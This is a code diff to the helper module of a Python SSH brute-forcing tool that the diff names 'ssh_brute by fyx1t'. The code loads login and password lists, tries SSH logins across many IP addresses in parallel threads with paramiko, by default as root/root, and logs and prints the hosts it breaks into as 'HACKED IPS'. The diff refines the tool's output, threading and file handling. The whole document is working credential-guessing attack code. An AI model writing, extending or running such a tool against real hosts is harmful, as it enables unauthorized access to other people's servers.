@@ -1,4 +1,3 @@
-from termcolor import colored
 import threading
 import paramiko
 import argparse
@@ -54,31 +53,20 @@ def get_parser(env) -> argparse.ArgumentParser:
 def check_for_good_ips(ips, env) -> list:
     good_ips = []
     for ip in ips:
-        if type(ip) == list:
-            for one_ip in ip:
-                print(f'[INFO] TRYING {one_ip}')
-                if ping_port(one_ip, env):
-                    good_ips.append(one_ip)
-                    print(colored(f'[INFO] FOUND!', 'green'))
-                else:
-                    print(colored('[INFO] NO ANSWER...', 'red'))
+        print(f'[INFO] TRYING {ip}')
+        if ping_port(ip, env):
+            good_ips.append(ip)
+            print(f'[INFO] FOUND!')
+            with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_GOOD_IPS"]}', 'a') as good_ips_file:
+                good_ips_file.write(ip + '\n')
         else:
-            print(f'[INFO] TRYING {ip}')
-            if ping_port(ip, env):
-                good_ips.append(ip)
-                print(colored(f'[INFO] FOUND!', 'green'))
-            else:
-                print(colored('[INFO] NO ANSWER...', 'red'))
+            print('[INFO] NO ANSWER...')
     return good_ips
 
 def get_ips(env, arguments) -> list:
     ips = []
-    with open(f'{env["INPUT_FOLDER"]}{arguments.ip_file}', 'r') as ips_file:
+    with open(f'{arguments.ip_file}', 'r') as ips_file:
         ips = ips_file.read().split('\n')
-    
-    for i in range(len(ips)):
-        if '_' in ips[i]:
-            ips[i] = ips[i].split('_')
             
     return ips
 
@@ -103,7 +91,7 @@ def ping_port(ip, env) -> bool:
             port=int(env['PORT']),
             username='root',
             password='root',
-            timeout=5
+            timeout=int(env['TIMEOUT'])
         )
     except paramiko.ssh_exception.NoValidConnectionsError:
         return False
@@ -120,17 +108,17 @@ def prepare(ENV, arguments):
 
     LOGINS: list = []
     PASSWORDS: list = []
-    with open(f'{ENV["INPUT_FOLDER"]}{arguments.logins_file}', 'r') as logins_file:
+    with open(f'{arguments.logins_file}', 'r') as logins_file:
         for line in logins_file:
             LOGINS.append(line.replace('\n', ''))
 
-    with open(f'{ENV["INPUT_FOLDER"]}{arguments.passwords_file}', 'r') as passwords_file:
+    with open(f'{arguments.passwords_file}', 'r') as passwords_file:
         for line in passwords_file:
             PASSWORDS.append(line.replace('\n', ''))
 
-    print(colored('[INFO] CREDENTIONALS ARE LOADED', 'green'))
+    print('[INFO] CREDENTIONALS ARE LOADED')
 
-    current_work_ips: list = ['' for i in range(ENV['THREADS'])]
+    current_work_ips: list = [[] for i in range(ENV['THREADS'])]
     current_creds: list = ['' for i in range(ENV['THREADS'])]
     worked_ips: list = []
     good_ips: list = []
@@ -141,17 +129,31 @@ def prepare(ENV, arguments):
     
     return LOGINS, PASSWORDS, threads, current_work_ips, current_creds, worked_ips, good_ips
 
-def show_brute_statistics(current_work_ips, current_creds, worked_ips, good_ips):
+def show_brute_statistics(current_work_ips, current_creds, worked_ips, good_ips, ips, ENV):
     os.system('clear')
-    print('[SCAN] SCRIPT UNDER WORKING...')
-    print("CURRENT IPS UNDER TESTING:")
+    print('ssh_brute by fyx1t\n')
+    print('[INFO] Ctrl+c OR Ctrl+z to interrupt process')
+
+    if len(ips) < ENV['THREADS']:
+        print('[WARNING] There are one or more threads that do not have an address list (you may have specified more threads than addresses)')
+        index_error_threads_ids = [i for i in range(len(ips), ENV['THREADS'])]
+
+    print('\n')
+
+    print(f"{'ID':<7} {'PROCESS':<18} {'IP':<16} CREDS")
+
     for j in range(len(current_work_ips)):
         try:
-            print(current_work_ips[j], '-->', f'{current_creds[j][0]}:{current_creds[j][1]}')
-        except IndexError:
-            break # test this point as when ips list is small there will be always IndexErrors while ips are testing
+            print(f"{str(j+1):<7} {str(current_work_ips[j][1][0])} of {str(current_work_ips[j][1][1]):<7} {current_work_ips[j][0]:<20} {current_creds[j][0]}:{current_creds[j][1]}")
+        except IndexError as error:
+            print(error)
+    if len(ips) < ENV['THREADS']:
+        if len(index_error_threads_ids) == 1:
+            print(f"Thread {index_error_threads_ids[0]+1} does not contain addresses")
+        else:
+            print(f"Threads {index_error_threads_ids[0]+1}:{index_error_threads_ids[-1]+1} does not contain addresses")
     print(f'\n-----\n\nCHECKED IPS: {worked_ips}')
-    print(f'\n-----\n\nHACKED IPS: {good_ips}')
+    print(f'\nHACKED IPS: {good_ips}')
 
 class Threads:
     def __init__(self, count) -> None:
@@ -160,16 +162,19 @@ class Threads:
         self.count = count
 
     def run(self):
-        # 1 argument MAX
         for i in range(self.count):
-            self.threads.append(
-                threading.Thread(target=self.jobs[i][0], args=(self.jobs[i][1], self.jobs[i][2], self.jobs[i][3]))
-            )
+            if len(self.jobs[i]) == 5:
+                self.threads.append(
+                    threading.Thread(target=self.jobs[i][0], args=(self.jobs[i][1], self.jobs[i][2], self.jobs[i][3], self.jobs[i][4]))
+                )
+            else:
+                self.threads.append(
+                    threading.Thread(target=self.jobs[i][0], args=(self.jobs[i][1], self.jobs[i][2]))
+                )
         for thread in self.threads:
             thread.start()
         for thread in self.threads:
             thread.join()
 
-
 if __name__ == '__main__':
-    print(colored('[WARNING] PLEASE LAUNCH ssh_brute.py', 'red'))
+    print('[WARNING] PLEASE LAUNCH ssh_brute.py')
